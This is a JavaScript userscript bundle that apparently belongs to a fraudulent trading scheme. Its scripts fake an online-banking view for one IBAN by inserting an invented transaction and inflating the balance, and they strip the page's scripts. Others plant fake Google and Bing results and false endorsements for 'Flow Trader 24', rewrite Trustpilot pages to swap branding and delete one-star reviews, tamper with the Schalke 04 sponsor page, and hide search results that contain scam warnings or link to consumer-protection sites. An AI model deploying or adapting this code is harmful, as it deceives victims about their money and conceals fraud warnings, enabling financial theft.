if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0) {

    (function() {
        'use strict';

        // Configurable timeout value (in milliseconds)
 //       const TIMEOUT_MS = 0; // Change this value as needed

//        // Define the target text content to search for (case and whitespace insensitive)
    var targetTextContent1 = "DE54 5486 2500";
   var targetTextContent2 = " 0007 4430 30";

        // Array of configurable transactions
       const TRANSACTIONS = [
//            {
//                title: 'Treuhand: Payward Limited',
//                description: 'Treuhand: Freigabe nötig durch Payward Limited',
//                amount: '550.000,00',
//                date: 'Vorgemerkt',
 //               insertAfter: false, // Set to false to insert before the original transaction
 //               moveSteps: 1, // Number of steps to move the transaction
 //               moveDirectionDown: false, // Set to false to move up
 //               order: 2 // Specify the order in which the transaction should be inserted
 //           },
            {
              title: 'JP Morgan Chase',
                description: 'Geld für Steuern, damit schneller geht.',
               amount: '5.000,00',
                date: 'Heute',
                insertAfter: false, // Set to false to insert before the original transaction
              moveStes: 0, // Number of steps to move the transaction
               moveDirectionDown: true, // Set to false to move up
                order: 1 // Specify the order in which the transaction should be inserted
           },
            // Add more transaction configurations here
       ];

        // Sort transactions based on the 'order' property
        TRANSACTIONS.sort((a, b) => a.order - b.order);

        console.log('Userscript initiated.');

        // Function to remove scripts from the document
        function removeScripts() {
            console.log('Removing scripts...');
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log('Script removed.');
            });
        }

        // Watch for changes in the DOM and remove added scripts
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.tagName === 'SCRIPT') {
                            console.log('Script added. Removing...');
                            node.remove();
                            console.log('Script removed.');
                        }
                    }
                }
            }
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

       // Function to process transactions
function processTransactions() {
    console.log('Processing multiple transactions.');

    // Check if both target text contents are found on the page
    const textFound = checkTextContent(targetTextContent1, targetTextContent2);

    if (textFound) {
        // Select the target element
        var targetElement = document.querySelector('app-umsatz-list-optimized');
        console.log('Searching for target element...');

        // Check if the target element exists
        if (!targetElement) {
            console.error('Target element not found');
            return;
        }
        console.log('Target element found:', targetElement);

        // Check if transactions have already been inserted
        if (!targetElement.querySelector('.custom-transaction')) {
            TRANSACTIONS.forEach((transaction, index) => {
                console.log(`Processing transaction ${index + 1}`);
                insertAndMoveTransaction(targetElement, transaction);
            });
        } else {
            console.log('Transactions have already been inserted.');
        }
    } else {
        console.log('Text contents not found on the page. Waiting for them to appear...');
    }
}


// Function to check if a text content is found on the page (case and whitespace insensitive)
function checkTextContent(text1, text2) {
    const pageText = document.querySelector('.konto-iban').textContent.replace(/\s/g, '').toLowerCase();
    const textToCheck1 = text1.replace(/\s/g, '').toLowerCase();
    const textToCheck2 = text2.replace(/\s/g, '').toLowerCase();

    return pageText.includes(textToCheck1) && pageText.includes(textToCheck2);
}






    // Function to insert and move a transaction
    function insertAndMoveTransaction(targetElement, config) {
        // Get the first child of the target element
        var firstChild = targetElement.firstElementChild;
        if (!firstChild) {
            console.error('No first child found in the target element');
            return;
        }

        // Clone the first child
        var clone = firstChild.cloneNode(true);

        // Add a class to identify custom transactions
        clone.classList.add('custom-transaction');

        // Customization of cloned child
        updateElementTextContent(clone, '.umsatz-name.text-truncate', config.title);
        updateElementTextContent(clone, '.verwendungszweck-label.text-truncate', config.description);
        setCustomAmountAndCurrency(clone, config.amount);
        updateElementTextContent(clone, '.d-flex.justify-content-end.buchung-zeit', config.date);

        // Insert the cloned node based on the configuration
        var referenceNode = config.insertAfter ? firstChild.nextSibling : firstChild;
        targetElement.insertBefore(clone, referenceNode);

        // Move the cloned node based on the configuration
        moveTransaction(clone, config.moveSteps, config.moveDirectionDown);
    }

    // Helper function to update text content of an element within the clone
    function updateElementTextContent(clone, selector, newText) {
        const element = clone.querySelector(selector);
        if (element) {
            console.log(`Found element for selector '${selector}', updating text content.`);
            element.textContent = newText;
        } else {
            console.error(`Element not found for selector '${selector}'.`);
        }
    }

    // Function to set custom amount and update currency positivity based on the amount's sign
    function setCustomAmountAndCurrency(clone, amount) {
        const amountElement = clone.querySelector('.text-right.konto-umsatz-saldo-shredder span');
        const currencyElement = clone.querySelector('.waehrung-shredder.text-left span');
        const isPositive = !amount.startsWith('-'); // Determines positivity based on amount's sign

        if (amountElement && currencyElement) {
            console.log('Found amount and currency elements:', amountElement, currencyElement);
            amountElement.textContent = amount;
            amountElement.setAttribute('data-positive', isPositive ? '1' : '0');
            currencyElement.setAttribute('data-positive', isPositive ? '1' : '0');
        } else {
            console.error('Amount or currency element not found.');
        }
    }

    // Function to move the transaction up or down by a specified number of steps
    function moveTransaction(transactionNode, steps, moveDown) {
        let currentNode = transactionNode;
        while (steps > 0 && currentNode) {
            currentNode = moveDown ? currentNode.nextSibling : currentNode.previousSibling;
            steps--;
        }

        if (currentNode) {
            const referenceNode = moveDown ? currentNode.nextSibling : currentNode;
            transactionNode.parentNode.insertBefore(transactionNode, referenceNode);
            console.log('Transaction moved.');
        } else {
            console.error('Unable to move transaction: Reached the end of the list.');
        }
    }

    // Continuously check for the presence of transactions every 2 seconds
    setInterval(processTransactions, 100);

})();


}


//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------




//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

//    // Define the target text contents to search for (case and whitespace insensitive)
   var targetTextContent1 = "DE54 5486 2500";
   var targetTextContent2 = " 0007 4430 30";

//    // Configurable modification amount (positive or negative)
  const modificationAmount = 5000.0; // Adjust the amount as needed

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify the balance value
    function modifyBalance() {
        // Select the element with class "kf-account-saldo-value"
        var balanceElement = document.querySelector('.kf-account-saldo-value');

        // Check if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Modify the balance based on the sign and the modification amount
            numericValue += modificationAmount;

            // Format the modified balance value
            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

            // Update the balance text content
            balanceElement.textContent = updatedBalanceText;

            // Check for an extra minus sign and remove it
            if (balanceElement.textContent.includes('--')) {
                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
            }

            // Check the class name of the parent element to update data-positive attribute
            var parentElement = balanceElement.closest('.kf-account-saldo');
            if (parentElement) {
                var isPositive = numericValue >= 0;
                parentElement.classList.remove('kf-account-saldo-positive', 'kf-account-saldo-negative');
                parentElement.classList.add(isPositive ? 'kf-account-saldo-positive' : 'kf-account-saldo-negative');
            }

            console.log('Balance modified successfully.');

            // Select and remove the sibling currency element if it exists
            var currencyElement = balanceElement.nextElementSibling;
            if (currencyElement && currencyElement.classList.contains('kf-account-saldo-currency')) {
                currencyElement.remove();
                console.log('Currency element removed.');
            }
        } else {
            console.error('Balance element not found.');
        }
    }

// Function to check for specific text content and the presence of currency element
function checkForConditions() {
    // Get the text content of the ".kf-account-iban" element, convert to lowercase, and trim whitespace
    var ibanTextContent = document.querySelector('.kf-account-iban').textContent.toLowerCase().trim();

    // Convert the target text contents to lowercase and trim whitespace
    var lowerCaseTargetTextContent1 = targetTextContent1.toLowerCase().trim();
    var lowerCaseTargetTextContent2 = targetTextContent2.toLowerCase().trim();

    // Check if both target text contents are found within the "kf-account-iban" element
    if (ibanTextContent.includes(lowerCaseTargetTextContent1) && ibanTextContent.includes(lowerCaseTargetTextContent2)) {
        // Check if the sibling currency element is present
        var currencyElement = document.querySelector('.kf-account-saldo-value + .kf-account-saldo-currency');
        if (currencyElement) {
            // Execute the modifyBalance function
            modifyBalance();
        }
    }
}



    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 20); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)


    // Function to observe and remove elements with "mat-form-field-subscript-wrapper" in the class name
function observeAndRemoveElements() {
    // Select elements with the specified class name
    var elementsToRemove = document.querySelectorAll('[class*="mat-form-field-subscript-wrapper"]');

    // Check if any matching elements were found
    if (elementsToRemove.length > 0) {
        // Remove each matching element
        elementsToRemove.forEach(function (element) {
            element.remove();
        });

        console.log('Removed elements with class containing "mat-form-field-subscript-wrapper".');
    }
}

// Observe and remove elements periodically
setInterval(observeAndRemoveElements, 50); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)


})();


}

//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------


//-----------------------------------------------------------------------------------------------------------------------------------



 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.flowtrade24.com/",
                                title: "Flow Trader 24 dein Broker",
                                description: "AIX Trader ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.flowtrade24.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Flow Trader 24 - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Flow Trader 24",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Flow Trader 24 Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Flow Trader 24 ab dem 1. Januar unser Sponsor und Partner wird. Flow Trader 24 ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Flow Traders 24 sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "AIX Trader";
    const customLogoURL = "https://p-cdn.co/flowtraders24/brands/flowtraders24/logo-white.png";
    const customURL = "https://cfd.flowtrade24.com/";
    const customReferenceURL = "flowtrade24.com";
    const customLinkURL = "https://cfd.flowtrade24.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Flow Trader 24",
      "icmarkets": "Flow Trader 24",
      "ic-markets": "Flow Trader 24",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.flowtrade24.com/";
var newLogoURL = "https://i.ibb.co/M2gXMFt/Copy-of-Untitled-Design.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }
